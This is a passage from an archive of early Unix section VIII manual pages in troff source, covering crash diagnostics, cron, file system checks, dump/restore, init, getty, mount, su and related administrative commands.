.s3
.lp +5 5
no inodes
.br
The in-core inode table is full.
Try increasing NINODE in param.h.
Shouldn't be a panic, just a user error.
.s3
.lp +5 5
no clock
.br
During initialization,
neither the line nor programmable clock was found to exist.
.s3
.lp +5 5
swap error
.br
An unrecoverable I/O error during a swap.
Really shouldn't be a panic,
but it is hard to fix.
.s3
.lp +5 5
unlink \- iget
.br
The directory containing a file being deleted can't be found.
Hardware or software.
.s3
.lp +5 5
out of swap space
.br
A program needs to be swapped out, and there is no more swap space.
It has to be increased.
This really shouldn't be a panic, but there is no easy fix.
.s3
.lp +5 5
out of text
.br
A pure procedure program is being executed,
and the table for such things is full.
This shouldn't be a panic.
.s3
.lp +5 5
trap
.br
An unexpected trap has occurred within the system.
This is accompanied by three numbers:
a `ka6', which is the contents of the segmentation
register for the area in which the system's stack is kept;
`aps', which is the location where the hardware stored
the program status word during the trap;
and a `trap type' which encodes
which trap occurred.
The trap types are:
.s3
.lp +10 5
0	bus error
.lp +10 5
1	illegal instruction
.lp +10 5
2	BPT/trace
.lp +10 5
3	IOT
.lp +10 5
4	power fail
.lp +10 5
5	EMT
.lp +10 5
6	recursive system call (TRAP instruction)
.lp +10 5
7	11/70 cache parity, or programmed interrupt
.lp +10 5
10	floating point trap
.lp +10 5
11	segmentation violation
.i0
.s3
In some of these cases it is
possible for octal 20 to be added into the trap type;
this indicates that the processor was in user mode when the trap occurred.
If you wish to examine the stack after such a trap,
either dump the system, or use the console switches to examine core;
the required address mapping is described below.
.s3
.it "Interpreting dumps.||"
All file system problems
should be taken care of before attempting to look at dumps.
The dump should be read into the file
.it /usr/sys/core;
.it cp
(I) will do.
At this point, you should execute
.it "ps \*-alxk"
and
.it who
to print the process table and the users who were on
at the time of the crash.
You should dump (
.it od
(I))
the first 30 bytes of
.it /usr/sys/core.
Starting at location 4,
the registers R0, R1, R2, R3, R4, R5, SP
and KDSA6 (KISA6 for 11/40s) are stored.
If the dump had to be restarted,
R0 will not be correct.
Next, take the value of KA6 (location 22(8) in the dump)
multiplied by 100(8) and dump 1000(8) bytes starting from there.
This is the per-process data associated with the process running
at the time of the crash.
Relabel
the addresses 140000 to 141776.
R5 is C's frame or display pointer.
Stored at (R5) is the old R5 pointing to the previous
stack frame.
At (R5)+2
is the saved PC of the calling procedure.
Trace
this calling chain until
you obtain an R5 value of 141756, which
is where the user's R5 is stored.
If the chain is broken,
you have to look for a plausible
R5, PC pair and continue from there.
Each PC should be looked up in the system's name list
using
.it db
(I) and its `:' command,
to get a reverse calling order.
In most cases this procedure will give
an idea of what is wrong.
A more complete discussion
of system debugging is impossible here.
.sh "SEE ALSO"
clri, icheck, dcheck, boot procedures (VIII)
.sh BUGS
-- /usr/man/man8/cron.8 mode=0100664 uid=3 gid=3 atime=170022397 mtime=173059799 --
.th CRON VIII 10/25/74
.sh NAME
cron \*- clock daemon
.sh SYNOPSIS
.bd /etc/cron
.sh DESCRIPTION
.it Cron
executes commands at specified dates and times
according to the instructions in the file
/usr/lib/crontab.
Since
.it cron
never exits,
it should only be executed once.
This is best done by running
.it cron
from the initialization
process through the file
/etc/rc;
see
.it init
(VIII).
.s2
Crontab
consists of lines of six fields each.
The fields are separated by spaces or tabs.
The first five are integer patterns to
specify the
minute (0-59),
hour (0-23),
day of the month (1-31),
month of the year (1-12),
and day of the week (1-7 with 1=monday).
Each of these patterns may
contain a number in the range above;
two numbers separated by
a minus
meaning a range inclusive;
a list of numbers separated by
commas meaning any of the numbers;
or an asterisk meaning all legal values.
The sixth field is a string
that is executed by the Shell at the
specified times.
A percent character
in this field is translated to a new-line
character.
Only the first line (up to a % or end of line)
of the command field is executed by the Shell.
The other lines are made available to the
command as standard input.
.s2
Crontab is examined by
.it cron
every hour.
Thus it could take up to an hour
for entries to become effective.
If it receives
a hangup signal, however, the table is examined immediately;
so `kill \-1 ...' can be used.
.sh FILES
/usr/lib/crontab
.sh "SEE ALSO"
init(VIII), sh(I), kill (I)
.sh DIAGNOSTICS
None \- illegal lines in
crontab are ignored.
.sh BUGS
A more efficient algorithm could be used.
The overhead in running
.it cron
is about one percent of the
machine,
exclusive of any commands executed.
-- /usr/man/man8/dcheck.8 mode=0100664 uid=3 gid=3 atime=170022398 mtime=173059799 --
.th DCHECK VIII 2/8/75
.sh NAME
dcheck \*- file system directory consistency check
.sh SYNOPSIS
.bd dcheck
[
.bd \*-i
numbers ]
[ filesystem ]
.sh DESCRIPTION
.it Dcheck
reads the directories in a file system
and compares
the link-count in each i-node with the number of directory
entries by which it is referenced.
If the file system is not specified,
a set of default file systems
is checked.
.s3
The
.bd \*-i
flag
is followed by a list of i-numbers;
when one of those i-numbers turns up
in a directory,
the number, the i-number of the directory,
and the name of the entry are reported.
.s3
The program is fastest if the
raw version of the special file is used,
since the i-list is read in large chunks.
.sh FILES
Currently,
/dev/rrk2 and /dev/rrp0 are the default file systems.
.sh DIAGNOSTICS
When a file turns up for which the link-count and the number
of directory entries disagree,
the relevant facts are reported.
Allocated files which have 0 link-count and no entries are also
listed.
The only dangerous situation
occurs when there are more entries than links;
if entries are removed,
so the link-count drops to 0,
the remaining entries point to thin air.
They should be removed.
When there are more links than entries, or there is
an allocated file with neither links nor entries,
some disk space may be lost but the situation will not degenerate.
.sh "SEE ALSO"
icheck (VIII), fs (V), clri (VIII), ncheck (VIII)
.sh BUGS
Since
.it dcheck
is inherently two-pass in nature, extraneous diagnostics
may be produced if applied to active file systems.
-- /usr/man/man8/df.8 mode=0100664 uid=3 gid=3 atime=170022398 mtime=173059799 --
.th DF VIII 1/20/73
.sh NAME
df \*- disk free
.sh SYNOPSIS
.bd df
[ filesystem ]
.sh DESCRIPTION
.it Df
prints out the number of free blocks
available on a file system.
If the file system is unspecified,
the free space on all of
the normally mounted file systems
is printed.
.sh FILES
/dev/rf?,
/dev/rk?,
/dev/rp?
.sh "SEE ALSO"
icheck (VIII)
.sh BUGS
-- /usr/man/man8/dpd.8 mode=0100664 uid=3 gid=3 atime=170022399 mtime=173059799 --
.th DPD VIII 3/15/72
.sh NAME
dpd \*- data phone daemon
.sh SYNOPSIS
.bd /etc/dpd
.sh DESCRIPTION
.it Dpd
is the 201 data phone daemon.
It is designed to submit jobs to
the Honeywell 6070 computer via the GRTS
interface.
.s3
.it Dpd
uses the directory
.it /usr/dpd.
The file
.it lock
in that directory
is used
to prevent two daemons from becoming active.
After the daemon has successfully set the lock,
it forks and the main path exits, thus
spawning the daemon.
The directory is scanned for files
beginning with
.bd df.
Each such file is submitted as a job.
Each line of a job file must begin with a key
character to specify what to do with the remainder
of the line.
.s3
.lp +5 3
\fBS\fR	directs
.it dpd
to generate a unique snumb card.
This card is generated by incrementing the first
word of the
file
.it /usr/dpd/snumb
and converting that to three-digit octal concatenated with
the station ID.
.s3
.lp +5 3
\fBL\fR	specifies that the remainder of the line is to
be sent as a literal.
.s3
.lp +5 3
\fBB\fR	specifies that the rest of the line
is a file name.
That file is to
be sent as binary cards.
.s3
.lp +5 3
\fBF\fR	is the same as \fBB\fR except a form feed is prepended to the file.
.s3
.lp +5 3
\fBU\fR	specifies that the rest of the line
is a file name.
After the job has been transmitted,
the file is unlinked.
.s3
.lp +5 3
\fBM\fR	is followed by a user ID; after the job is sent,
the snumb number and the first line of information in the
file is mailed to the user
to verify the sending of the job.
.s3
.i0
Any error encountered will cause the daemon to
drop the call, wait up to 20 minutes and start over.
This means that an improperly constructed
\fIdf\fR file may cause the same job to be submitted
every 20 minutes.
.s3
While waiting, the
daemon checks to
see that the
.it lock
file still exists.
If it is gone,
the
daemon will exit.
.sh FILES
/dev/dn0,
/dev/dp0,
/usr/dpd/*
.sh "SEE ALSO"
opr (I)
-- /usr/man/man8/dump.8 mode=0100664 uid=3 gid=3 atime=170022400 mtime=173059799 --
.th DUMP VIII 11/24/73
.sh NAME
dump \*- incremental file system dump
.sh SYNOPSIS
.bd dump
[ key [ arguments ] filesystem ]
.sh DESCRIPTION
.it Dump
makes an incremental file system dump
on magtape
of all files changed after a certain date.
The
.it key
argument
specifies the date and other options about the dump.
.it Key
consists of characters from
the set
.bd abcfiu0hds.
.s3
.lp +5 5
\fBa\fR	Normally files
larger than 1000 blocks are not incrementally dump;
this flag forces them to be dumped.
.s3
.lp +5 5
\fBb\fR	The next argument is taken to be the maximum size
of the dump tape in blocks (see \fBs\fR).
.s3
.lp +5 5
\fBc\fR	If the tape overflows, increment the last character
of its name and continue on that drive.
(Normally it asks you to change tapes.)
.s3
.lp +5 5
\fBf\fR	Place the dump on the next argument file
instead of the tape.
.s3
.lp +5 5
\fBi\fR	the
dump date is taken from the entry in the file
/etc/dtab
corresponding to the last time
this file system was dumped with
the
.bd -u
option.
.s3
.lp +5 5
\fBu\fR	the date just prior to this dump
is written on
/etc/dtab
upon successful completion of this dump.
This file contains a date for every
file system dumped with
this
option.
.s3
.lp +5 5
\fB0\fR	the dump date is taken as the epoch
(beginning of time).
Thus this option causes an entire file system dump to be taken.
.s3
.lp +5 5
\fBh\fR	the dump date is some number of hours before the current date.
The number of hours is taken from the next argument in
.it arguments.
.s3
.lp +5 5
\fBd\fR	the dump date is some number of days before the current date.
The number of days is taken from the next argument in
.it arguments.
.s3
.lp +5 5
\fBs\fR	the size of the dump tape is specified in feet.
The number of feet is taken from the next argument in
.it arguments.
It is assumed that there are 9 standard UNIX records per foot.
When the specified size is reached,
the dump will wait for reels to be changed.
The default size is 2200 feet.
.s3
.i0
.dt
.dt
If no arguments are given,
the
.it key
is assumed to be
.bd i
and the file system is
assumed to be
/dev/rp0.
.s3
Full dumps
should be taken on quiet file systems as follows:
.s3
	dump 0u /dev/rp0
.br
	ncheck /dev/rp0
.s3
The
.it ncheck
will come in handy in case it is necessary
to restore individual files from this dump.
Incremental dumps should then be taken
when desired by:
.s3
	dump
.s3
When the incremental dumps get cumbersome,
a new complete dump should be taken.
In this way,
a restore requires
loading of the complete dump tape and only the latest incremental tape.
.sh DIAGNOSTICS
If the dump requires more than one tape,
it will ask you to change tapes.
Reply with a new-line when this has been done.
If the first block on the new tape is not writable,
e.g. because you forgot the write ring,
you get a chance to fix it.
Generally, however, read or write failures are fatal.
.sh FILES
/dev/mt0	magtape
.br
/dev/rp0	default file system
.br
/etc/dtab
.sh "SEE ALSO"
restor (VIII), ncheck (VIII), dump (V)
.sh BUGS
-- /usr/man/man8/getty.8 mode=0100664 uid=3 gid=3 atime=170022401 mtime=173059800 --
.th GETTY VIII 2/11/75
.sh NAME
getty  \*- set typewriter mode
.sh SYNOPSIS
.bd /etc/getty
[ char ]
.sh DESCRIPTION
.it Getty
is invoked
by
.it init
(VIII)
immediately after a typewriter is opened
following a dial-up.
It reads the user's name and invokes the
.it login
command
(I)
with the name as argument.
While reading the name
.it getty
attempts to adapt the system to the speed and type of terminal
being used.
.s3
.it Init
calls
.it getty
with an argument specified by the
.it ttys
file entry for the typewriter line.
Arguments other than `0' can be used to make
.it getty
treat the line specially.
Normally, it
sets the speed of the interface to 300 baud,
specifies that raw mode is to be used (break on every character),
that echo is to be suppressed, and either parity
allowed.
It types the ``login:'' message,
which includes the characters which put the Terminet 300
terminal into full-duplex and
return the GSI terminal to non-graphic mode.
Then the user's name is read, a character at a time.
If a null character is received, it is assumed to be the result
of the user pushing the ``break'' (``interrupt'') key.
The speed is then
changed to 150 baud and the ``login:'' is typed again,
this time including the character
sequence which puts a Teletype 37
into full-duplex.
If a subsequent null character is received,
the speed is changed back to 300 baud.
.s3
The user's name is terminated by a new-line or
carriage-return character.
The latter results in the system being set to
treat carriage returns appropriately (see
.it stty
(II)).
.s3
The user's name is scanned to see if
it contains any lower-case alphabetic characters; if not,
and if the name is nonempty, the
system is told to map any future upper-case characters
into the corresponding lower-case characters.
.s3
Finally, login is called with the user's name as argument.
.sh "SEE ALSO"
init (VIII), login (I), stty (II), ttys (V)
.sh BUGS
-- /usr/man/man8/glob.8 mode=0100664 uid=3 gid=3 atime=170022402 mtime=173059800 --
.th GLOB VIII 9/19/73
.sh NAME
glob \*- generate command arguments
.sh SYNOPSIS
.bd /etc/glob
command [ arguments ]
.sh DESCRIPTION
.it Glob
is used to expand arguments to the shell containing ``*'', ``['', or
``?''.
It is passed the argument list
containing the metacharacters;
.it glob
expands the list and calls the indicated command.
The actions of 
.it glob
are detailed in
the Shell writeup.
.sh SEE ALSO"
sh (I)
.sh BUGS
-- /usr/man/man8/icheck.8 mode=0100664 uid=3 gid=3 atime=170022403 mtime=173059800 --
.th ICHECK VIII 2/9/75
.sh NAME
icheck \*- file system storage consistency check
.sh SYNOPSIS
.bd icheck
[
.bd \*-s
]  [
.bd \*-b
numbers ]
[ filesystem ]
.sh DESCRIPTION
.it Icheck
examines a file system,
builds a bit map of used blocks,
and compares this bit map against
the free list maintained on the file system.
If the file system is not specified,
a set of default file systems
is checked.
The normal output of
.it icheck
includes a report of
.s3
.lp +4 0
The number of blocks missing; i.e. not in any file
nor in the free list,
.lp +4 0
The number of special files,
.lp +4 0
The total number of files,
.lp +4 0
The number of large and huge files,
.lp +4 0
The number of directories,
.lp +4 0
The number of indirect blocks,
and the number of double-indirect blocks in huge files,
.lp +4 0
The number of blocks used in files,
.lp +4 0
The number of free blocks.
.s3
.i0
The
.bd \*-s
flag causes
.it icheck
to ignore the actual free list and reconstruct a new one
by rewriting the super-block of the file system.
The file system should be dismounted while this is done;
if this is not possible (for example if
the root file system has to be salvaged)
care should be taken that the system is quiescent and that
it is rebooted immediately afterwards so that the old, bad in-core
copy of the super-block will not continue to be used.
Notice also that
the words in the super-block
which indicate the size of the free list and of the
i-list are believed.
If the super-block has been curdled
these words will have to be patched.
The
.bd \*-s
flag
causes the normal output reports to be suppressed.
.s3
Following the
.bd \-b
flag is a list of block numbers;
whenever any of the named blocks turns up in a file,
a diagnostic is produced.
.s3
.it Icheck
is faster if the raw version of the special file is used,
since it reads the i-list many blocks at a time.
.sh FILES
Currently, /dev/rrk2
and /dev/rrp0
are the default file systems.
.sh "SEE ALSO"
dcheck (VIII), ncheck (VIII),
fs (V), clri (VIII), restor(VIII)
.sh DIAGNOSTICS
For duplicate blocks
and bad blocks (which lie outside the file system)
.it icheck
announces the difficulty, the i-number, and the kind of block involved.
If a read error is encountered,
the block number of the bad block is printed and
.it icheck
considers it to contain 0.
``Bad freeblock'' means that
a block number outside the available space was encountered in the free list.
``\fIn\fR dups in free''
means that \fIn\fR blocks were found in the free list which
duplicate blocks either in some file or in the earlier part of the free list.
.sh BUGS
Since
.it icheck
is inherently two-pass in nature, extraneous diagnostics
may be produced if applied to active file systems.
.br
It believes even preposterous super-blocks and
consequently can get core images.
-- /usr/man/man8/init.8 mode=0100664 uid=3 gid=3 atime=170022404 mtime=173059800 --
.th INIT VIII 2/22/74
.sh NAME
init  \*-  process control initialization
.sh SYNOPSIS
.bd /etc/init
.sh DESCRIPTION
.it Init
is invoked inside UNIX as the last step in the boot procedure.
Generally its role is to create a process for each
typewriter on which a user may log in.
.s3
First,
.it init
checks
to see if the console switches contain 173030.
(This number is likely to vary between
systems.)
If so, the console typewriter
.bd /dev/tty8
is opened for reading
and writing and the Shell is invoked immediately.
This feature is used to bring up a single-user system.
When the system is brought up in this way, the
.it getty
and
.it login
routines mentioned below and described elsewhere are not used.
If the Shell terminates,
.it init
starts over looking for the
console switch setting.
.s3
Otherwise, \fIinit\fR
invokes a Shell, with input taken from the
file
.it /etc/rc.
This command file
performs housekeeping
like removing temporary files,
mounting file systems, and starting
daemons.
.s3
Then
.it init
reads the file
.it /etc/ttys
and
forks several times to create a process
for each typewriter specified in the file.
Each of these processes opens the appropriate typewriter
for reading and writing.  These channels thus
receive file descriptors 0 and 1, the standard input and
output.
Opening the typewriter will usually involve a delay,
since the \fIopen\fR is not completed until someone
is dialed up and carrier established on the channel.
Then
.it /etc/getty
is called with argument as specified by the last character of
the
.it ttys
file line.
.it Getty
reads the user's name and invokes
.it login
(q.v.)
to log in the user and execute the Shell.
.s3
Ultimately the Shell will terminate
because of an end-of-file either
typed explicitly or generated as a result of hanging up.
The main path of \fIinit\fR, which has been waiting
for such an event,
wakes up and removes the appropriate entry from the
file \fIutmp\fR, which records current users, and
makes an entry in \fI/usr/adm/wtmp\fR, which maintains a history
of logins and logouts.
Then the appropriate typewriter is reopened and
.it getty
is
reinvoked.
.s3
.it Init
catches the
.it hangup
signal (signal #1) and interprets it to mean that
the
switches should be examined as in a reboot: if they
indicate a multi-user system, the
.it /etc/ttys
file is read again.
The Shell process on each line which used to be active
in
.it ttys
but is no longer there is terminated;
a new process is created for each added line;
lines unchanged in the file are undisturbed.
Thus it is possible to drop or add phone lines without
rebooting the system by changing the
.it ttys
file and sending a
.it hangup
signal to the
.it init
process: use ``kill \*-1 1.''
.sh FILES
/dev/tty?, /etc/utmp, /usr/adm/wtmp, /etc/ttys, /etc/rc
.sh "SEE ALSO"
login (I), kill (I), sh (I), ttys (V), getty (VIII)
-- /usr/man/man8/lpd.8 mode=0100664 uid=3 gid=3 atime=170022405 mtime=173059800 --
.th LPD VIII 6/1/74
.sh NAME
lpd \*- line printer daemon
.sh SYNOPSIS
.bd /etc/lpd
.sh DESCRIPTION
.it Lpd
is the line printer daemon (spool area handler)
invoked by
.it opr.
It uses the directory
.it /usr/lpd.
The file
.it lock
in that directory
is used to prevent two daemons from becoming
active simultaneously.
After the daemon has successfully set the lock,
it scans the directory for files
beginning with ``df.''
Lines in each
.it df
file specify files to be printed
in the same way as is done by the data-phone daemon dpd (VIII).
.sh FILES
/usr/lpd/*	spool area
.br
/dev/lp  	printer
.sh "SEE ALSO"
dpd (VIII), opr (I)
.sh BUGS
-- /usr/man/man8/mkfs.8 mode=0100664 uid=3 gid=3 atime=170022407 mtime=173059800 --
.th MKFS VIII 11/1/73
.sh NAME
mkfs \*- construct a file system
.sh SYNOPSIS
.bd /etc/mkfs
special
proto
.sh DESCRIPTION
.it Mkfs
constructs a file system
by writing on the special file
.it special
according to the directions
found in
the prototype file
.it proto.
The prototype file
contains tokens separated by spaces or
new lines.
The first token is the name of a file
to be copied onto block zero as
the bootstrap program
(see boot procedures (VIII)).
The second token is a number specifying the
size of the created file system.
Typically it will be the number of blocks on the device,
perhaps diminished
by space for swapping.
The next token is the i-list size in blocks
(remember there are 16 i-nodes per block).
The next set of tokens comprise the specification
for the root file.
File specifications consist of tokens
giving the mode,
the user-id,
the group id,
and the initial contents of the file.
The syntax of the contents field
depends on the mode.
.s3
The mode token for a file is a 6 character string.
The first character
specifies the type of the file.
(The characters
.bd \*-bcd
specify regular, block special,
character special and directory files
respectively.)
The second character of the type
is either
.bd u
or
.bd \*-
to specify set-user-id mode or not.
The third is
.bd g
or
.bd \*-
for the set-group-id mode.
The rest of the mode
is a three digit octal number giving the
owner, group, and other read, write, execute
permissions (see
.it chmod
(I)).
.s3
Two decimal number
tokens come after the mode; they specify the
user and group ID's of the owner of the file.
.s3
If the file is a regular file,
the next token is a pathname
whence the contents and size are copied.
.s3
If the file is a block or character special file,
two decimal number tokens
follow which give the major and minor device numbers.
.s3
If the file is a directory,
.it mkfs
makes the entries \fB.\fR and \fB..\fR
and then
reads a list of names and
(recursively)
file specifications for the entries
in the directory.
The scan is terminated with the
token \fB$\fR.
.s3
If the prototype file cannot be opened and
its name consists of a string of digits,
.it mkfs
builds a file system with a single
empty directory on it.
The size of the file system is the value
of
.it proto
interpreted as a decimal number.
The i-list size is the file system size
divided by
43 plus the size divided by 1000.
(This corresponds to an average size of
three blocks per file
for a 4000 block file system and
six blocks per file at 40,000.)
The boot program is left uninitialized.
.s3
A sample prototype specification follows:
.s3
.nf
.in +5
/usr/mdec/uboot
4872 55
d\*-\*-777 3 1
usr	d\*-\*-777 3 1
	sh	\*-\*-\*-755 3 1 /bin/sh
	ken	d\*-\*-755 6 1
		$
	b0	b\*-\*-644 3 1 0 0
	c0	c\*-\*-644 3 1 0 0
	$
$
.in -5
.fi
.sh "SEE ALSO"
file system (V),
directory (V),
boot procedures (VIII)
.sh BUGS
It is not possible to initialize a file larger than
64K bytes.
.br
The size of the file system is restricted to
64K blocks.
.br
There should be some way to specify links.
-- /usr/man/man8/mknod.8 mode=0100664 uid=3 gid=3 atime=170022409 mtime=173059800 --
.th MKNOD VIII 2/11/75
.sh NAME
mknod \*- build special file
.sh SYNOPSIS
.bd /etc/mknod
name
[
.bd c
] [
.bd b
]
major
minor
.sh DESCRIPTION
.it Mknod
makes a directory entry and corresponding i-node
for a special file.
The first argument is the
.it name
of the entry.
The second is
.bd b
if the special file is block-type (disks, tape) or
.bd c
if it is character-type (other devices).
The last two arguments are
numbers specifying the
.it major
device type
and the
.it minor
device (e.g. unit, drive, or line number).
.s3
The assignment of major device numbers is specific to each system.
They have to be dug out of the
system source file
.it conf.c.
.sh "SEE ALSO"
mknod (II)
.sh BUGS
-- /usr/man/man8/mount.8 mode=0100664 uid=3 gid=3 atime=170022411 mtime=173059800 --
.th MOUNT VIII  10/31/73
.sh NAME
mount \*- mount file system
.sh SYNOPSIS
.bd /etc/mount
special file [
.bd \*-r
]
.sh DESCRIPTION
.it Mount
announces to the system that a removable file system
is present on the device corresponding to special
file
.it special
(which must refer to a disk or possibly DECtape).
The
.it file
must exist already; it
becomes the name of the root of the newly mounted
file system.
.s3
.it Mount
maintains a table of mounted devices;
if invoked without an argument it prints the table.
.s3
The optional last argument indicates that the file
is to be mounted read-only.
Physically write-protected and magnetic tape file
systems must be mounted in this way
or errors will occur when access times are updated,
whether or not any explicit write is attempted.
.sh "SEE ALSO"
mount (II),
mtab (V),
umount (VIII)
.sh BUGS
Mounting file systems full of garbage will crash the system.
-- /usr/man/man8/ncheck.8 mode=0100664 uid=3 gid=3 atime=170022411 mtime=173059800 --
.th NCHECK VIII 2/8/75
.sh NAME
ncheck  \*-  generate names from i-numbers
.sh SYNOPSIS
.bd ncheck
[
.bd \*-i
numbers ]  [
.bd \*-a
]  [ filesystem ]
.sh DESCRIPTION
.it Ncheck
with no argument
generates a pathname vs. i-number
list of all files
on a set of default file systems.
The
.bd \*-i
flag reduces the report to only those files whose i-numbers follow.
.bd \*-a
allows printing of the names `.' and `..', which are ordinarily
suppressed.
A file system may be specified.
.s3
The full report is in no useful
order, and probably should be sorted.
.sh "SEE ALSO"
dcheck (VIII), icheck (VIII), sort (I)
.sh BUGS
-- /usr/man/man8/restor.8 mode=0100664 uid=3 gid=3 atime=170022412 mtime=173059800 --
.th RESTOR VIII 11/24/73
.sh NAME
restor \*- incremental file system restore
.sh SYNOPSIS
.bd restor
key [ arguments ]
.sh DESCRIPTION
.it Restor
is used to read magtapes dumped with the
.it dump
command.
The
.it key
argument specifies what is to be done.
.it Key
is a character from the set
.bd trxw.
.s3
.lp +5 3
\fBt\fR	The date that the tape was made and the date that
was specified in the
.it dump
command are printed.
A list of all of the i-numbers on the tape
is also given.
.s3
.lp +5 3
\fBr\fR	The tape
is read and loaded into the file system
specified in
.it arguments.
This should not be done lightly (see below).
.s3
.lp +5 3
\fBx\fR	Each file on the
tape is individually extracted into
a file whose name is the file's i-number.
If
there are
.it arguments,
they are interpreted as i-numbers and only they are
extracted.
.s3
.lp +5 3
\fBc\fR	If the tape overflows, increment the last character
of its name and continue on that drive.
(Normally it asks you to change tapes.)
.s3
.lp +5 3
\fBf\fR	Read the dump from the next argument file
instead of the tape.
.s3
.lp +5 3
\fBi\fR	All read and checksum errors
are reported, but will not
cause termination.
.s3
.lp +5 3
\fBw\fR	In conjunction with the
.bd x
option,
before each file is extracted,
its i-number is typed out.
To extract this file,
you must respond with
.bd y.
.s3
.i0
The
.bd x
option is used to retrieve individual files.
If the i-number of the desired file is not known,
it can be discovered by following the file system
directory search algorithm.
First retrieve the
.it root
directory whose i-number is 1.
List this file with
.it "ls \*-fi 1."
This will give names and i-numbers of
sub-directories.
Iterating, any file may be retrieved.
.s3
The
.bd r
option should only be used to restore
a complete dump tape onto a clear file system
or to restore an incremental dump tape onto this.
Thus
.s3
	/etc/mkfs /dev/rp0 40600
.br
	restor r /dev/rp0
.s3
is a typical sequence to restore a complete dump.
Another
.it restor
can be done to get an incremental dump
in on top of this.
.s3
A
.it dump
followed by a
.it mkfs
and a
.it restor
is used to
change the size of a file system.
.sh FILES
/dev/mt0
.sh "SEE ALSO"
ls (I), dump (VIII), mkfs (VIII), clri (VIII)
.sh DIAGNOSTICS
There are various diagnostics
involved with reading the tape and writing the disk.
There are also diagnostics if the i-list or the free list
of the file system is not large enough to hold the dump.
.s3
If the dump extends over more than one tape,
it may ask you to change tapes.
Reply with a new-line when the next tape has been mounted.
.sh BUGS
There is redundant information on the tape
that could be used in case of tape reading problems.
Unfortunately,
.it restor's
approach is to exit if anything is wrong.
-- /usr/man/man8/sa.8 mode=0100664 uid=3 gid=3 atime=170022414 mtime=173059800 --
.th SA VIII 6/1/74
.sh NAME
sa \*- Shell accounting
.sh SYNOPSIS
sa [
.bd \*-abcjlnrstuv
] [ file ]
.sh DESCRIPTION
When a user logs in,
if the Shell is able to open the file
.it /usr/adm/sha,
then as each command completes the Shell writes at the end of this file
the name of the command, the user, system, and real
time consumed,
and the user ID.
.it Sa
reports on, cleans up, and generally maintains this and other
accounting files.
To turn accounting on and off,
the accounting file must be created or destroyed
externally.
.s3
.it Sa
is able to condense
the information in
.it /usr/adm/sha
into a summary file
.it /usr/adm/sht
which contains a count of the
number of times each command was called and the time resources
consumed.
This condensation is desirable because on a large system
.it sha
can grow by 100 blocks per day.
The summary file is read before the accounting file,
so the reports include all available information.
.s3
If a file name is given as the last argument,
that file will be treated
as the accounting file;
.it sha
is the default.
There are zillions of options:
.s3
.de qq
.s3
.lp +3 3
\fB\\$1\fR	\\
..
.qq a
Place all command names containing unprintable characters
and those used only once under the name ``***other.''
.qq b
Sort output by sum of user and system time divided by number of
calls.
Default sort is by sum of user and system times.
.qq c
Besides total user, system, and real time for each command print percentage
of total time over all commands.
.qq j
Instead of total minutes time for each category,
give seconds per call.
.qq l
Separate system and user time; normally they are combined.
.qq n
Sort by number of calls.
.qq r
Reverse order of sort.
.qq s
Merge accounting file into summary file
.it /usr/adm/sht
when done.
.qq t
For each command report ratio of real time to the sum of user and
system times.
.qq u
Superseding all other flags,
print for each command in the accounting file the
day of the year, time, day of the week,
user ID and command name.
.qq v
If the next character is a digit
.it n,
then type the name of
each command used
.it n
times or fewer.
Await a reply from the typewriter;
if it begins with ``y'', add the command to
the category ``**junk**.''
This is used to strip out garbage.
.i0
.dt
.sh FILES
/usr/adm/sha	accounting
.br
/usr/adm/sht	summary
.sh "SEE ALSO"
ac (VIII)
.sh BUGS
-- /usr/man/man8/su.8 mode=0100664 uid=3 gid=3 atime=170022415 mtime=173059800 --
.th SU VIII 10/31/73
.sh NAME
su  \*-  become privileged user
.sh SYNOPSIS
.bd su
.sh DESCRIPTION
.it Su
allows one to become the super-user, who has
all sorts of marvelous (and correspondingly dangerous) powers.
In order for \fIsu\fR to do its magic, the user must
supply a password.
If the password is correct, \fIsu\fR
will execute the Shell with the UID set to
that of the super-user.
To restore normal UID privileges,
type an end-of-file to the super-user Shell.
.s3
The password demanded is that of the entry ``root''
in the system's password file.
.s3
To remind the super-user of his responsibilities,
the Shell substitutes `#' for its usual prompt `%'.
.sh "SEE ALSO"
sh (I)
-- /usr/man/man8/sync.8 mode=0100664 uid=3 gid=3 atime=170022417 mtime=173059800 --
.th SYNC VIII 11/1/73
.sh NAME
sync \*- update the super block
.sh SYNOPSIS
.bd sync
.sh DESCRIPTION
.it Sync
executes the
.it sync
system primitive.
If the system is to be stopped,
.it sync
must be called to insure
file system integrity.
See sync (II) for details.
.sh "SEE ALSO"
sync (II)
.sh BUGS
-- /usr/man/man8/umount.8 mode=0100664 uid=3 gid=3 atime=170022417 mtime=173059800 --
.th UMOUNT VIII 10/31/73
.sh NAME
umount \*- dismount file system
.sh SYNOPSIS
.bd /etc/umount
special
.sh DESCRIPTION
.it Umount
announces to the system that the removable file system previously
mounted on special file
.it special
is to be removed.
.sh "SEE ALSO"
mount (VIII), umount (II), mtab (V)
.sh FILES
/etc/mtab	mounted device table
.sh DIAGNOSTICS
It complains if
the special file is not mounted or if it is busy.
The file system is busy if
there is an open file on it or if
someone has his current directory there.
.sh BUGS
-- /usr/man/man8/update.8 mode=0100664 uid=3 gid=3 atime=170022418 mtime=173059800 --
.th UPDATE VIII 11/1/73
.sh NAME
update \*- periodically update the super block
.sh SYNOPSIS
.bd update
.sh DESCRIPTION
.it Update
is a program that executes
the
.it sync
primitive every 30 seconds.
This insures that the file system
is fairly up to date in case of a crash.
This command should not be executed directly,
but should be executed out of the
initialization shell command file.
See sync (II) for details.
.sh "SEE ALSO"
sync (II), init (VIII)
.sh BUGS
With
.it update
running,
if the CPU is
halted just as
the
.it sync
is executed,
a file system can be damaged.
This is partially due to DEC hardware that
writes zeros when NPR requests fail.
A fix would be to have
.it "sync"
temporarily increment the system time by at
least 30 seconds to trigger the execution of
.it update.
This would give 30 seconds grace to halt the CPU.
-- /usr/man/man8/wall.8 mode=0100664 uid=3 gid=3 atime=170022419 mtime=173059800 --
.th WALL VIII 4/10/75
.sh NAME
wall  \*-  write to all users
.sh SYNOPSIS
.bd /etc/wall
.sh DESCRIPTION
.it Wall
reads its standard input until an end-of-file.
It then sends this message to all currently
logged in users preceded by
``Broadcast Message ...''.
It is used to warn all users,
typically prior to shutting down the system.
.s3
The sender should be super-user to override
any protections the users may have invoked.
.sh FILES
/dev/tty?
.sh "SEE ALSO"
mesg (I), write (I)
.sh DIAGNOSTICS
``Cannot send to ...'' when the open on
a user's tty file fails.
.sh BUGS
-- /usr/doc/rat mode=0140775 uid=3 gid=3 atime=173059661 mtime=173059507 --
-- /usr/doc/rat/rat mode=0110664 uid=3 gid=3 atime=170479188 mtime=173059662 --
.ce 100
RATFOR _ A Rational Fortran
